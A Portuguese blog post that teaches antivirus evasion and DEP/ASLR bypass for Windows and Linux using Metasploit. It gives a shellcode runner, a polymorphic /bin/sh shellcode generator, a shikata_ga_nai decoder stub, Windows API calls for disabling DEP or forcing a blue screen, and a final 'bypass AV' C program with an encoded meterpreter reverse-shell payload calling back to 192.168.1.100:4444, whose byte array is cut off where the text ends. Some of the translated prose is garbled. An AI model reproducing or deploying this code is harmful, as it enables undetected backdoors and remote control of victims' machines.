---
layout: post
title: Bypass Windows e Linux + metasploit [DEP ASLR]
categories: [Exploration]
tags: [DEP ,ASLR,bypass,windows,linux]
fullview: true
comments: true
---
<p>Há pouco tempo estava estudando sobre alocação de memoria, na tentaria de bypassar algumas proteções dos software Anti-vírus,  a princípio tentei de diversas forma usando Encode's do metasploit fiz várias combinações de encode's esperando a saída de um backdoor  Não-detectável, os encoder's do metasploit são muitos bons, pra época que eles foram desenvolvidos rsrsrs, porém para os AV eles já são bem conhecidos. Com isso em mente resolvi modelar um backdoor de uma forma customizada, não irei usar o msfpayload para gerar os executáveis, mas irei usar o msfencode para gerar o shellcode, os shellcode's depois gerado precisamos criar um  ponteiro para que ele possa receber a posicao onde nosso payload está. </p>
{% highlight c++ %} 
==================Metasploit =====================
 ./msfpayload windows / shell_bind_tcp C
===============================================
Char payload [4096] = "shellcode Here" ;
int main (int argc, char ** argv) { 
        (* (void (*) ()) payload) (); 
        return (0); 
}
{% endhighlight %}
<p> Contudo, Esse código acima já está bem manjado pelos AV, mas é um código funcional tanto para o linux quanto para windows. Nem todo shellcode poderá funcionar no windows, talvez você receba um aviso de violação de memoria, ou até mesmo um "falha de segmentação " no linux.  Vamos para os encoder's:</p>
<pre class="code">
mh40xf@mh4x0flabs:~#./msfencode -l -a x86 

Framework Encoders (architectures: x86)
=======================================

Name                    Rank       Description
----                    ----       -----------
generic/none            normal     The "none" Encoder
x86/alpha_mixed         low        Alpha2 Alphanumeric Mixedcase Encoder
x86/alpha_upper         low        Alpha2 Alphanumeric Uppercase Encoder
x86/avoid_utf8_tolower  manual     Avoid UTF8/tolower
x86/call4_dword_xor     normal     Call+4 Dword XOR Encoder
x86/countdown           normal     Single-byte XOR Countdown Encoder
x86/fnstenv_mov         normal     Variable-length Fnstenv/mov Dword XOR Encoder
x86/jmp_call_additive   normal     Jump/Call XOR Additive Feedback Encoder
x86/nonalpha            low        Non-Alpha Encoder
x86/nonupper            low        Non-Upper Encoder
x86/shikata_ga_nai      excellent  Polymorphic XOR Additive Feedback Encoder
x86/single_static_bit   manual     Single Static Bit
x86/unicode_mixed       manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
x86/unicode_upper       manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
</pre>
<p> De todos, O que merece mais atenção e claro porque é  o mais usado é o shikata_ga_nai, até porque ele gera shellcode Polymorphic, ou seja, cada shellcode gerado será diferente do outro, o Rank dele é excellent (lembrei de mortalKombat agora hahahaha EXCELLENTE), creio eu que ele foi desenvolvido para bypassar IDS, NIDS etc... pois alguns IDS bloqueia sequencias de caracter em hex, que são conhecido como malicioso ex: uma shellbind, reverse. e quanto a estrutura do shelllcode ? então fica mais ou menos assim:</p>
<pre class="code">
                 No SHellcode 
|=============|=================|   
|      Decode        | Shellcode Encoded  |             |------------------------------------------------------------------------------------------------------|
|=============|=================|        4   |                                                                                                                               |
             PE File polymorphic                              V                                                                                                                               |
======================               ==================           ==================        ====================              |
|  PE Header (entry point)  |                |   Original Code      |               |           Decode          |         |       encoded Códe       |                |
======================               ==================           ==================        ====================               |
            1   |                                                                                                            ^             |                              ^               3                |
                |---------------------------------------------------------------------------------------|            V                              |                |--------------|
                                                                                                                                       2   | -----------------------|
</pre>
{% highlight python %}
import sys
import random
import os
import re

def gen_rand(size):
    return str(os.urandom(size))


def get_xor():
    instruction = ["rax", "rbx", "rcx", "rdx", "rsi"]
    xoring = {}
    pushing = {}
    cleanup = ["\x48\x89\xe6\x48\x31\xc0", "\x48\x31\xc0\x48\x89\xe6"]
    xoring["rax"] = "\x48\x31\xc0"
    xoring["rbx"] = "\x48\x31\xdb"
    xoring["rcx"] = "\x48\x31\xc9"
    xoring["rdx"] = "\x48\x31\xd2"
    xoring["rsi"] = "\x48\x31\xf6"
    pushing["rax"] = "\x50"
    pushing["rbx"] = "\x53"
    pushing["rcx"] = "\x51"
    pushing["rdx"] = "\x52"
    pushing["rsi"] = "\x56"

    current = instruction[random.randint(0, 4)]
    return [xoring[current], pushing[current], cleanup[random.randint(0, 1)]]
    

def get_shell():
    shell = ["\x2f\x62\x69\x6e\x2f\x2f\x73\x68", "\x2f\x2f\x62\x69\x6e\x2f\x73\x68"]
    return shell[random.randint(0, 1)]

shellcode = "\xeb\x01[RAND1]\x68[RAND2][XOR][PUSH]\x48\xbb[SHELL]\x53\x48\x89\xe7[PUSH]\x48\x89\xe2\x57[CLEANUP]\x04[COUNT1]\x68[RAND3]\x04[COUNT2]\x0f\x05[RAND4]"

shellcode = shellcode.replace("[RAND1]", str(random.randint(50, 57)).decode("hex"))
shellcode = shellcode.replace("[RAND2]", gen_rand(4))
shellcode = shellcode.replace("[RAND3]", gen_rand(4))
shellcode = shellcode.replace("[RAND4]", gen_rand(random.randint(4, 8)))
shellcode = shellcode.replace("[SHELL]", get_shell())

count = random.randint(1, 58)
shellcode = shellcode.replace("[COUNT1]", chr(count))
shellcode = shellcode.replace("[COUNT2]", chr(59 - count))

current = get_xor()
shellcode = shellcode.replace("[XOR]", current[0])
shellcode = shellcode.replace("[PUSH]", current[1])
shellcode = shellcode.replace("[CLEANUP]", current[2])

print "\\x" + "\\x".join(re.findall("..", shellcode.encode("hex")))
{% endhighlight %}
<p>Outro encode também  muito bom é o <a>jmp_call_additive</a>.</p>
{% highlight python %}
'Stub'       =>
            "\xfc"                + # cld
            "\xbbXORK"            + # mov ebx, key
            "\xeb\x0c"            + # jmp short 0x14
            "\x5e"                + # pop esi
            "\x56"                + # push esi
            "\x31\x1e"            + # xor [esi], ebx
            "\xad"                + # lodsd
            "\x01\xc3"            + # add ebx, eax
            "\x85\xc0"            + # test eax, eax
            "\x75\xf7"            + # jnz 0xa
            "\xc3"                + # ret
            "\xe8\xef\xff\xff\xff", # call 0x8
{% endhighlight  %}
<p>O que acontece no  codificadores Aditivo de feedback é que cada (comprimento de dados) DWORD por exemplo, é  XORed com uma chave XOR diferente dependendo do anterior DWORD que foi XORed por XOR chave e vice-versa, até chegarmos a primeira DWORD que foi codificado por a chave XOR gerado. Jmp_call_additive utiliza uma forma muito dinâmica, e uma boa gabiarra para decodificar / codificar o  payload.</p>
<h3> Bypass DEP  Data Execution Prevention</h3>
<p> Vamos entender essa ganbiarra que "deu certo", falando do DEP, então esse cara é um recurso de segurança em sistemas modernos, Mac OS, linux e windows. Este recurso destina-se a impedir a execução de códigos de uma região da memória (Bit NX)não-executável em um aplicativo ou serviço. Já que surgiu o assunto vamos lá o Bit NX que deriva da expressão em inglês No eXecute, é uma tecnologia usada em alguns processadores e sistemas operacionais que separa de modo rígido as áreas de memória que podem ser usadas para execução de código daquelas que só podem servir para armazenar dados. Ele é usada com propósitos de segurança.(wiki) ai já sabe né essa versão foi implementada pela AMD inicialmente, mas logo em seguida a Intel também criou sua versão chamada de (Bit XD) do inglês  eXecute Disable. em fim o DEP fica ainda mais eficiente quando trabalha junto com o ASLR ou address space layout randomization, que o significado da sigla já diz tudo, mas vamos lá o ASLR é uma técnica que envolve organizar aleatoriamente as posições das áreas-chave de dados, usualmente incluindo  a base do executável e posição de bibliotecas, heap, e stack, no espaço de endereço do processo. </p>
<h3> Tá e Como funciona  isso tudo ? </h3>
<p>Basicamente esses troços foram criados para acabar com a vida de quem curti um shellcode, seja injetar ou até mesmo faze-los. dai você pode perguntar: tá e como eles fazem isso ? eles fazem isso  através de compensação aleatoriamente o local de módulos e certas estruturas na memória.(hehehe falei bonito :D) resumindo o DEP impedi que certos setores de memória, por exemplo, a pilha, de ser executado. Quando combinados, torna-se extremamente difícil de explorar vulnerabilidades em aplicações que utilizam shellcode ou programação orientada a retorno (ROP). Sem mais delongas o Mestre m0nad (Vitor Ramos Mello) fez  um incrível post mostrando como ele referi-se ROP na Unha :D.  <a href="http://blog.tempest.com.br/victor-mello/return-oriented-programming-unha.html" target="_blank">Link do post</a>, vale a pena conferir sou faz desse cara :), dando uma explicada caso você não entendeu o esquema vamos lá, o ROP basicamente ROP essencialmente envolve encontrar trechos existentes de código do programa (called Getgets ) e pulando para eles, de modo que você produz um resultado desejado. Uma vez que o código é parte da memória executável legítimo, DEP e NX não importa.  Estes Getgets são encadeados através da stack, que contém o 'exploit' payload. Cada entrada na stack corresponde ao endereço do dispositivo próxima da ROP. Cada dispositivo é sob a forma de instr1; instr2; instr3; InstrN ...; ret , de modo que o ret vai saltar para o próximo endereço na pilha depois de executar as instruções, encadeando assim os gadgets juntos. Muitas vezes, os valores adicionais têm de ser colocado na pilha, de modo a completar com sucesso a cadeia, devido às instruções que, de outro modo ficam no caminho. O truque consiste em encadear essas ROPs em conjunto, a fim de chamar a função de proteção de memória, como VirtualProtect , que é então usado para fazer o executável pilha, para que o seu shellcode pode executar, através de um jmp esp ou gadget equivalente. Ferramentas como  <a href="http://redmine.corelan.be/projects/mona" target="_blank">Mona.py</a>, pode ser usado para gerar essas correntes gadgets ROP, ou encontrar aparelhos ROP em geral.</p>
<h3> Legal! e o tão eficiente ASLR ? </h3>
<p>Existem algumas maneiras de contornar o ASLR segue a dica:</p>
<pre class="code">
Sobrescrever RET direto - Muitas vezes os processos com ASLR ainda irá carregar módulos não-ASLR, permitindo-lhe apenas executar o shellcode através de um jmp esp .
Partial EIP overwrite - substituir apenas uma parte da EIP, ou usar uma divulgação de informações confiável na pilha para descobrir qual é o verdadeiro EIP deve ser, em seguida, usá-lo para calcular o seu alvo. Nós ainda precisamos de um módulo não-ASLR para este embora.
NOP spray  - Criar um grande bloco de PON para aumentar as chances de salto pouso na memória legítimo. Difícil, mas possível, mesmo quando todos os módulos são ASLR habilitado. Não vai funcionar se a DEP está ligado embora.
Bruteforce - Se você pode tentar uma façanha com uma vulnerabilidade que não faz o programa falhar, você pode BruteForce 256 diferentes endereços de destino até que ele funciona.
</pre>
<p>A única maneira de contornar de forma confiável DEP e ASLR é através de um vazamento de ponteiro. Esta é uma situação em que um valor para a pilha, para um local de confiança, pode ser usado para localizar um ponteiro função utilizável ou Gadgets ROP. Uma vez feito isso, às vezes é possível para criar uma carga que ultrapassa de forma confiável ambos os mecanismos de proteção.</p>
<h3>Brincando com Windows Funções para Bypassar DEP</h3>
<h4><a name="weapon"></a>Choose your weapon</h4>
<table bordercolor="#000000" bordercolordark="#ffffff" width="100%"  bordercolorlight="#ffffff" border="1">
<tbody>
<tr>
<td>API / OS</td>
<td>XP SP2</td>
<td>XP SP3</td>
<td>Vista SP0</td>
<td>Vista SP1</td>
<td>Windows 7</td>
<td>Windows 2003 SP1</td>
<td>Windows 2008</td>
</tr>
<tr>
<td>
<p align="left">VirtualAlloc</p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
</tr>
<tr>
<td>HeapCreate</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
</tr>
<tr>
<td>
<p align="left">SetProcessDEPPolicy</p>
</td>
<td>
<p align="center"><font color="#ff0000">no (1)</font></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><font color="#ff0000">no (1)</font></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><font color="#ff0000">no (2)</font></p>
</td>
<td>
<p align="center"><font color="#ff0000">no (1)</font></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
</tr>
<tr>
<td>
<p align="left">NtSetInformationProcess</p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><font color="#ff0000">no (2)</font></p>
</td>
<td>
<p align="center"><font color="#ff0000">no (2)</font></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><font color="#ff0000">no (2)</font></p>
</td>
</tr>
<tr>
<td>
<p align="left">VirtualProtect</p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
</tr>
<tr>
<td>
<p align="left">WriteProcessMemory</p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
</tr>
</tbody>
</table>
<p>Todas funções acima vale a pena conhecer mesmo elas sendo desabilitada pela microsoft, algumas dessas API já causaram muito estrago em termo de exploiting para o windows, uma delas tem a possibilidade de desabilitar o famoso DEP que tanto falamos, NtSetInformationProcess() que pode ser usada para simplesmente mudar os privilégio do DEP, entre outros métodos de bypass do DEP, como ROP e ret2lib que o m0nad também já escreveu sobre vale a pena procurar no blog dele, voltando ao assunto lembra da tela azul da morte (quer dizer até hoje ainda tem rsssr) então, podemos replicar aquele mesmo erro tão renomado da microsoft usando essa mesma API são chamados os Critical Process  que  é um tipo de processo que o Windows necessita para estar em execução - csrss.exe é um exemplo de tal processo. Sempre que um processo como este termina a sua execução (ou está terminada) do Windows responderá com uma autêntica tela azul da morte . A definição de um processo como um processo crítico é feito por PInvoking NtSetInformationProcess , de ntdll.dll (requer privilégios de depuração ). Mais informações sobre este método pode ser encontrado abaixo, na seção de codificação.</p>
<pre class="code">
Agora, sempre que um processo crítico seja encerrado, o kernel irá lançar um BSOD , com a seguinte verificação de erros:

*** STOP: 0x000000F4

0x000000F4 é o valor para CRITICAL_OBJECT_TERMINATION . 
</pre>
<p>a chamada dela em C# fica mais ou menos assim:</p>
<pre>
[ DllImport ( "ntdll.dll" ,  SetLastError  = True )]
private  static  extern  int  NtSetInformationProcess ( IntPtr hProcess ,  int processInformationClass ,  <br>
ref  int processInformation ,  int processInformationLength );
NTSTATUS NtSetInformationProcess(
IN HANDLE hProcessHandle,
IN PROCESS_INFORMATION_CLASS ProcessInformationClass,
IN PVOID ProcessInformation,
IN ULONG ProcessInformationLength );
Método Detalhes :
IntPtr hProcess = o identificador de processo "
int processInformationClass = é como uma 'flag' - nós fornecemos este valor 0x1D (BreakOnTermination)
ref int processInformation = valor para essa flag (1 = habilitado / 0 = disabled), neste caso, 1 significa que é um processo crítico
int processInformationLength = é o valor fornecido para a flag que, no nosso caso, é o tamanho de um inteiro
</pre>
<p>Desativar a DEP para um processo que você precisa para fazer uma chamada para NtSetInformationProcess () com o ProcessInformationClass conjunto para Process- ExecuteFlags (0x22) eo parâmetro ProcessInformation definido para MEM_EXECUTE_OPTION_ENABLE (0x2). O problema com a simples criação de seu shellcode 
para fazer este apelo é que leva alguns parâmetros nulos, bem como, o que é problemático para a maioria shellcode (ver "Bad-Personagem Filtering" na página 75) Portanto, o truque envolve alterar  nosso shellcode no meio de uma função que  vai chamar NtSetInformationProcess () com os parâmetros necessários já na Stack. a aplicação desse conceito em assembly fica a seguinte:</p>
<pre class="code">
7c935d6d 6a04 push 0x4 &#61663; Length := 4
7c935d6f 8d45fc lea eax,[ebp-0x4] 
7c935d72 50 push eax &#61663; &[ebp-4] (0x2)
7c935d73 6a22 push 0x22 &#61663; ProcessExecuteFlags
7c935d75 6aff push 0xff &#61663; NtCurrentProcess()
7c935d77 e8b188fdff call ntdll!ZwSetInformationProcess &#61663; Invoke
7c935d7c e9c076feff jmp 7c91d441 &#61663; NX agora está desabilitado 
</pre>
<p>Em fim, em termo de security, a microsoft fez bem em retirar a função NtSetInformationProcess (), já que a adição dela e algumas técnica de bypass como ROP e ret2libc faz com que deixe o windows completamente "exploitável", quer dizer ele já é né rsrss, pode ficar pior. Vamos entender cada função dessa acima logo e depois veremos como implementar uma shell reverse usando o meterpreter do metasploit, mas calma ae Fera vamos lá novamente.</p>
<h3>VirtualAlloc </h3>
<p> VirtualAlloc administra páginas no sistema de memória virtual do Windows, esta função irá alocar memória nova. Um dos parâmetros para esta função especifica o nível de execução / acesso da memória recém-alocado, por isso o objetivo é definir esse valor para EXECUTE_READWRITE. msdn --> http://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx</p>
<pre class="code">
LPVOID WINAPI VirtualAlloc(
  _In_opt_  LPVOID lpAddress,
  _In_      SIZE_T dwSize,
  _In_      DWORD flAllocationType,
  _In_      DWORD flProtect
);
</pre>
<p>
IpAddress --> Endereço inicial da região para alocar (= novo local onde você deseja alocar memória). Tenha em mente que este endereço pode ficar arredondado para o múltiplo mais próximo da granularidade de alocação. Você pode tentar colocar a fornecer um valor codificado para este parâmetro.<br>
<br>
dwSize --> Tamanho da região em bytes. (você provavelmente irá precisar para gerar este valor usando rop, a menos que sua exploração pode lidar com bytes nulos).<br>
<br>
flallocationType --> Defina para 0x1000 (MEM_COMMIT). Talvez precise rop para gerar e escrever este valor para a pilha.<br>
<br>
flProtect --> Defina para 0x40 (EXECUTE_READWRITE). Talvez precise rop para gerar e escrever este valor para a pilha.<br>
</p>
<p>Também tem a malloc() para Unix, que faz a mesma coisa, mas VirtualAlloc é a melhor escolha se você deseja controlar totalmente como sua alocação é feita, principalmente se você alocar grandes quantidades de memória. Para atribuições gerais, é melhor usar malloc - a razão é que VirtualAlloc é feito no kernel, malloc é parte do C-runtime (ele irá chamar VirtualAlloc ou algo assim para obter grandes pedaços de memória que ele, então, dividir-se em pequenos . peças) Como você pode ver se você ler os docs e entender sobre o techology mapeamento de memória, o VirtualAlloc não pode alocar pequenos pedaços de memória -. menor "pedaço" seria, no mínimo, 4KB Na verdade, malloc () usa "HeapAlloc" em vez de VirtualAlloc. Mas VirtualAlloc ainda melhor é para grandes blocos de memória, ou quando você tem necessidades especiais que não são cumpridas por malloc () - por exemplo, a memória precisa ser protegido de uma maneira especial, você quer se exceções quando há uma gravação para a memória ou algo assim. esta função só irá alocar memória nova. Você terá que usar uma segunda chamada API para copiar o shellcode em que a nova região e executá-lo. Então, basicamente, você precisa de uma segunda cadeia rop para alcançar este objetivo. Então, basicamente, o endereço de retorno para VirtualAlloc () precisa apontar para a cadeia rop que irá copiar o shellcode para a região recém-alocado e em seguida, saltar para ele).</p>
<h3>HeapCreate + Bônus</h3>
<p>Para usar HeapAlloc você precisa primeiro fazer HeapCreate, para criar um bloco de memória para alocar. . HeapAlloc é então usada para "dividir" o pedaço em pequenas porções Como foi dito, VirtualAlloc é para a reserva e / ou cometer um grande pedaço de memória - útil quando você precisa megabytes. Cometer aqui significa que o mapa de memória é preenchido com páginas de memória real [4KB porções], ao invés de apenas "esta memória existe no espaço do processo, mas não há realmente nenhuma memória real lá", que é "reserva". Se a memória não é cometido quando ele está sendo acessado, serão comprometidos no manipulador de falta de página. Isso é útil se você quiser reservar um realmente grande pedaço de memória, mas você não precisa necessariamente preencher todas as partes de que a memória com dados [por exemplo, uma tabela hash enorme, ou uma tabela indexada por alguns números "aleatórios".</p>
<pre class="code">
ANDLE WINAPI HeapCreate(
  __in  DWORD flOptions,
  __in  SIZE_T dwInitialSize,
  __in  SIZE_T dwMaximumSize
);
</pre>
<p>Esta função vai criar uma pilha privada que pode ser utilizada na nossa exploração. Espaço será reservado no espaço de endereço virtual do processo. Quando o parâmetro flOptions está definido para 0x00040000 (HEAP_CREATE_ENABLE_EXECUTE), todos os blocos de memória que são alocados a partir desta pilha, vai permitir a execução de código, mesmo se a DEP está ativado. Parâmetro dwInitialSize deve conter um valor que indica o tamanho inicial da pilha, em bytes. Se você definir esse parâmetro como 0, então uma página será alocado. O parâmetro dwMaximumSize se refere ao tamanho máximo da pilha, em bytes. Esta função, só vai criar um monte privado e marcá-la como executável. Você ainda alocar memória nesta pilha (com HeapAlloc por exemplo) e, em seguida, copiar o shellcode para esse local pilha (com memcpy (), por exemplo) Quando a função retorna CreateHeap, um ponteiro para a pilha de recém-criado será armazenado em eax. Você vai precisar desse valor para emitir uma chamada HeapAlloc ():</p>
<h3>SetProcessDEPPolicy </h3>
<pre class="code">
BOOL WINAPI SetProcessDEPPolicy(
  __in  DWORD dwFlags
);
</pre>
<p>Como podemos ver é preciso passar apenas um parâmetro para a função SetProcessDEPPolicy(), e este parâmetro deve ser definido como 0 para desativar a DEP para o processo atual. Para que esta função funcione, a atual Política DEP deve ser definido como OptIn ou OptOut. Se a diretiva é definida para AlwaysOn (ou AlwaysOff), então SetProcessDEPPolicy irá lançar um erro. Se um módulo é vinculado com / NXCOMPAT, a técnica não vai funcionar. Por último, e igualmente importante, ele só pode ser chamado para o processo apenas uma vez. Então, se essa função já foi chamado no processo atual (IE8 por exemplo, já o chama quando o processo é iniciado), não vai funcionar. msdn --> http://msdn.microsoft.com/en-us/library/bb736299%28v=VS.85%29.aspx </p>
<h3>VirtualProtect () essa sim é importante</h3>
<p>Como já expliquei em artigos anteriores, não podemos deixar de lado funções que são extremamente importante para tudo em si, é a VirtualProtect() presente até no windows 10 (isso se você estiver lendo esse artigo em 2014), essa função ela muda a proteção de acesso da memoria  do processo. E se você quiser usar essa função é preciso passar todos os 5 parâmetro exigidos. </p>
<pre class="code">
BOOL WINAPI VirtualProtect (
  __in LPVOID lpAddress,
  __in size_t dwSize,
  __in DWORD flNewProtect,
  __out PDWORD lpflOldProtect
);
</pre>
<p>using</p>
{% highlight c++ %}
if (0 == VirtualProtect(buf, len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        fprintf(stderr, "Error setting memory executable: error code %d\n", GetLastError());
        return 1;
    }        
{% endhighlight %}
<p>Para ver as permissões podemos usar o seguinte código: </p>
{% highlight c++ %} 
#include <Windows.h>
#include <assert.h>
#include <iostream>

int main()
{
    HMODULE hmod = GetModuleHandle(L"kernel32.dll");
    MEMORY_BASIC_INFORMATION info;
    // Start at PE32 header
    SIZE_T len = VirtualQuery(hmod, &info, sizeof(info));
    assert(len > 0);
    BYTE* dllBase = (BYTE*)info.AllocationBase;
    BYTE* address = dllBase;
    for (;;) {
        len = VirtualQuery(address, &info, sizeof(info));
        assert(len > 0);
        if (info.AllocationBase != dllBase) break;
        std::cout << "Address: " << std::hex << info.BaseAddress;
        std::cout << " (" << std::hex << info.RegionSize << ") ";
        std::cout << " protect = " << std::hex << info.Protect;
        DWORD oldprotect;
        if (info.Protect == 0) std::cout << ", VirtualProtect skipped" << std::endl;
        else {
            BOOL ok = VirtualProtect(info.BaseAddress, 
            info.RegionSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            std::cout << ", VirtualProtect = " << (ok ? "okay" : "Failed!") << std::endl;
        }
        address = (BYTE*)info.BaseAddress + info.RegionSize;
    }
    return 0;
}
{% endhighlight %}

A saída vai ser algum parecido com isso:
<pre>
Address: 77470000 (1000)  protect = 2, VirtualProtect = okay
Address: 77471000 (f000)  protect = 0, VirtualProtect skipped
Address: 77480000 (62000)  protect = 20, VirtualProtect = okay
Address: 774E2000 (e000)  protect = 0, VirtualProtect skipped
Address: 774F0000 (7e000)  protect = 2, VirtualProtect = okay
Address: 7756E000 (2000)  protect = 0, VirtualProtect skipped
Address: 77570000 (1000)  protect = 4, VirtualProtect = okay
Address: 77571000 (f000)  protect = 0, VirtualProtect skipped
Address: 77580000 (1000)  protect = 2, VirtualProtect = okay
Address: 77581000 (f000)  protect = 0, VirtualProtect skipped
Address: 77590000 (1a000)  protect = 2, VirtualProtect = okay
Address: 775AA000 (6000)  protect = 0, VirtualProtect skipped
Já em C# podemos invocar da lib kernel32.dll e passar esses argumento para um processo dessa forma:
</pre>

<p>Já em C# podemos invocar da lib kernel32.dll e passar esses argumento para um processo dessa forma:</p>
{% highlight c# %}
importando lib 
--------------------------
[DllImport("kernel32.dll", SetLastError = true)]
static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
   uint flNewProtect, out uint lpflOldProtect);

Passando permissões
--------------------------
public enum Protection
{
  PAGE_NOACCESS = 0x01,
  PAGE_READONLY = 0x02,
  PAGE_READWRITE = 0x04,
  PAGE_WRITECOPY = 0x08,
  PAGE_EXECUTE = 0x10,
  PAGE_EXECUTE_READ = 0x20,
  PAGE_EXECUTE_READWRITE = 0x40,
  PAGE_EXECUTE_WRITECOPY = 0x80,
  PAGE_GUARD = 0x100,
  PAGE_NOCACHE = 0x200,
  PAGE_WRITECOMBINE = 0x400
}
{% endhighlight  %}
<p>Certo que nem precisa disso pra executar um shellcode em c# , minha tool é a prova disso <a href="https://github.com/P0cL4bs/hanzoInjection"target="_blank">HanzoInejtion</a> inspirada em naruto :( que já ta acabando (:( sem sploilers). lembrando que ela returna verdadeiro ou falso, lógico :@. </p>
<h3>WriteProcessMemory ()</h3>
<p>vem de msdn --> http://msdn.microsoft.com/en-us/library/ms681674(VS.85).aspx, lol.</p>
<pre class="code">
BOOL WINAPI WriteProcessMemory (
  __in SEGURAR hProcess,
  __in LPVOID lpBaseAddress,
  __in LPCVOID lpBuffer,
  __in service size_t,
  __out size_t * lpNumberOfBytesWritten
);
</pre>
<p>Esta função permite que você copie seu shellcode para outro (executável) local para que você possa acessá-la e executá-la. Durante a cópia, WPM () irá garantir que o local de destino é marcado como gravável. Você só tem que ter certeza do destino alvo é executável.Esta função requer seis parâmetros na pilha, WriteProcessMemory () oferece funcionalidade DEP-bypass para múltiplos  cenários de exploração. Na situação em que um palpite decente pode ser feito para  a localização de shellcode, esta função revela-se um único conveniente  solução hop. Mesmo quando o local de shellcode é indeterminado, contanto  como espaço de pilha está disponível para cadeia vários retornos, WriteProcessMemory () é muito útil, também serve para outras coisa que veremos em breve :D.</p>
<p>A ideia de usar essa API é simples pode nos permite copiar o shellcode para uma região de memória com EXECUTAR atributos Depois poderemos saltar para ele O local de destino deve ser gravável e executável, e já que toquei no assunto andei lendo algumas coisas sobre o powershell do windows e da pra fazer uma infinidade de coisas achei um blog de um pesquisador bem conhecido e parece que me returnou uma luz , até o projeto do colbatstrike feito pelo Raphael a evolução que ele criou do meterpreter ainda em desenvolvimento, voltando ao assunto http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html esse é o blog tem algumas coisa que pode ajudar a compreensão de como usar as API nativa do windows. Essa API também é muito usada para fazer injetion process, caso ele tenha reservado maior quantidade na memoria podemos até executar outro file ou até mesmo ganhar o controle da aplicação basicamente muito idêntico ao migrate do meterpreter, penso em escreve sobre ele em breve como criar alguns script usando ruby.</p>
{% highlight c++ %}
#include <windows.h>
/*
------------------------------------------------
Autor: Mharcos Nesster (mh4x0f)  
Email:mh4root@gmail.com
 Greetx: Team P0cL4bs {N4sss, Chrislley, MovCode, Joridos , MMXM }
 github: https://github.com/P0cL4bs/HeapExecShellcode
bypass AV em C  and Assembly.
Shellcode execute Heap
-----------------------------------------------
*/
//section code permission to read to wite
#pragma section(".code",execute, read, write)
#pragma section(".codedata", read, write)
// secton native application
#pragma comment(linker,"/MERGE:.codedata=.code")
// rewrite memory
#pragma comment(linker,"/SECTION:.code,ERW")
// onde fica todas variável globais :D
//  all variable global   
#pragma data_seg(".codedata")
#pragma const_seg(".codedata")
#pragma code_seg(".code")


/* meterpreter 192.168.1.100 port 4444  encoded shikata_ga_nai 10 */
unsigned char shellcode[] =
"\xb8\xca\x31\x30\xe8\xda\xdf\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x86\x31\x42\x13\x83\xc2\x04\x03\x42\xc5\xd3\xc5\x33\x1b\xca"
"\x52\xe0\x6f\x52\xe0\xd4\x57\xcd\x48\x0e\xae\xbf\x0c\x61\x4d"
"\xd9\x71\x44\xa9\xda\x08\x52\x29\x15\x91\x69\xe6\x66\x23\xfd"
"\x5e\x9a\xce\xb5\x52\xc6\x16\xc8\xf7\x2b\x86\x17\xcf\xfd\xcd"
"\x9a\xbe\xc2\xb8\x2b\x95\xd5\xc4\xba\xc8\x41\xea\x78\x3a\x9e"
"\x81\x9d\xb5\xce\xea\xc2\xa9\xb5\x2d\xe2\x09\x32\xe3\x4f\xcf"
"\xd2\x59\x70\x42\x47\x2b\x35\xe7\xb5\x03\x70\xe7\x29\x09\x76"
"\xac\x7c\x89\x65\x93\x62\x8e\x1c\x91\xfb\xf9\x73\x67\xf2\x68"
"\x6e\x06\x11\x30\xb0\x28\x89\xcc\x66\x3e\x44\x05\xfa\x8f\x50"
"\x42\x23\xb5\xa8\x29\xa2\x99\x14\xb8\x79\x67\xc7\x45\x25\x6e"
